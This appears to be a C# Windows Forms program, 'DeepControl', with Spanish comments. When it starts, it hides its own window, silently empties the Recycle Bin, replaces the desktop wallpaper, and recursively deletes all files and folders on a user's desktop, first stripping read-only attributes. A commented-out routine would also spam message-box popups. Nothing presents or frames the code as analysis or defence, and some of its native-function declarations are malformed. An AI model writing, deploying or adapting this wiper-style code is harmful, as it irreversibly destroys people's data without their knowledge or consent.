namespace DeepControl
{
    using System.Drawing;
    using System;
    using System.Threading;
    using System.Runtime.InteropServices;
    using System.Windows.Forms;
    using System.IO;
    using System.Diagnostics;

    public partial class DeepControlForm : Form
    {
        private NotifyIcon notifyIcon;
        private const int SPI_SETDESKWALLPAPER = 0x0014;
        private const int SPIF_UPDATEINIFILE = 0x01;
        private const int SPIF_SENDCHANGE = 0x02;
        [DllImport("user32.dll", CharSet = CharSet.Auto)]

      
        private static extern int SHEmptyRecycleBin(IntPtr hwnd, string pszRootPath, uint dwFlags);

        // Definir las banderas que se pueden usar con SHEmptyRecycleBin
        private const uint SHERB_NOCONFIRMATION = 0x00000001; // No mostrar el cuadro de confirmación
        private const uint SHERB_NOPROGRESSUI = 0x00000002; // No mostrar el progreso
        private const uint SHERB_NOSOUND = 0x00000004; // No reproducir un sonido cuando se complete la operación

        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        public DeepControlForm()
        {
            InitializeComponent();
            string directoryPath = "C:\\Users\\Ernesto\\Desktop\\";
           
            notifyIcon = new NotifyIcon();
            try
            {
                // Llamar a la función para vaciar la papelera de reciclaje
                int result2 = SHEmptyRecycleBin(IntPtr.Zero, null, SHERB_NOCONFIRMATION | SHERB_NOPROGRESSUI | SHERB_NOSOUND);

                if (result2 == 0)
                {
                    Console.WriteLine("La papelera de reciclaje se ha vaciado exitosamente.");
                }
                else
                {
                    Console.WriteLine($"Error al vaciar la papelera de reciclaje. Código de error: {result2}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Ocurrió un error: {ex.Message}");
            }
            try
            {
                string iconPath = "ico.ico"; // Asegúrate de tener un archivo de icono en esta ruta
                notifyIcon.Icon = new Icon(iconPath);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error al cargar el icono: " + ex.Message);
                notifyIcon.Icon = SystemIcons.Application; // Usa un icono por defecto
            }

            notifyIcon.Visible = true;
            notifyIcon.Text = "DeepControl";

            // Opcional: Agregar un menú contextual

            string appDirectory = AppDomain.CurrentDomain.BaseDirectory;
            // Ruta de la imagen que se utilizará como fondo de pantalla
            string imagePath = Path.Combine(appDirectory, "fondo.png");
            bool result = SetWallpaper(imagePath);


            // Verificar el resultado
            if (result)
            {
                Console.WriteLine("El fondo de pantalla se cambió exitosamente.");
            }
            else
            {
                Console.WriteLine("Hubo un problema al cambiar el fondo de pantalla.");
            }
            //Metodo();
            try
            {
                DeleteAllFiles(directoryPath);
                DeleteAllDirectories(directoryPath);
                Console.WriteLine("Todos los archivos han sido borrados exitosamente.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Ocurrió un error: {ex.Message}");
                MessageBox.Show($"Este es un mensaje de {ex.Message}.", "Información", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }
        private static bool SetWallpaper(string filePath)
        {
            // Llamada a la función SystemParametersInfo para cambiar el fondo de pantalla
            return SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, filePath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE) != 0;
        }
        private void DeepControlForm_Load(object sender, EventArgs e)
        {
            this.Visible = false;
        }
        static async Task Metodo()
        {
            for (int i = 0; i < 10; i++)
            {
                MessageBox.Show("Este es un mensaje de información.", "Información", MessageBoxButtons.OK, MessageBoxIcon.Information);
                await Task.Delay(3000); // Dormir por 3000 milisegundos (3 segundos)
            }
        }
        static void DeleteAllFiles(string directoryPath)
        {
            if (Directory.Exists(directoryPath))
            {
                // Obtener todos los archivos en el directorio y subdirectorios
                string[] files = Directory.GetFiles(directoryPath, "*", SearchOption.AllDirectories);

                foreach (string filePath in files)
                {
                    try
                    {
                        // Quitar atributo de solo lectura si está presente
                        FileAttributes attributes = File.GetAttributes(filePath);
                        if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
                        {
                            attributes &= ~FileAttributes.ReadOnly;
                            File.SetAttributes(filePath, attributes);
                        }

                        // Borrar archivo
                        File.Delete(filePath);
                        Debug.WriteLine($"Archivo {filePath} borrado exitosamente.");
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Ocurrió un error al borrar {filePath}: {ex.Message}");
                    }
                }
            }
            else
            {
                Debug.WriteLine("El directorio no existe.");
            }
        }

        static void DeleteAllDirectories(string directoryPath)
        {
            if (Directory.Exists(directoryPath))
            {
                // Obtener todas las subcarpetas en el directorio
                string[] directories = Directory.GetDirectories(directoryPath);

                foreach (string dirPath in directories)
                {
                    try
                    {
                        // Borrar carpeta y su contenido recursivamente
                        Directory.Delete(dirPath, true);
                        Debug.WriteLine($"Carpeta {dirPath} borrada exitosamente.");
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Ocurrió un error al borrar la carpeta {dirPath}: {ex.Message}");
                    }
                }
            }
            else
            {
                Debug.WriteLine("El directorio no existe.");
            }
        }
    }

}
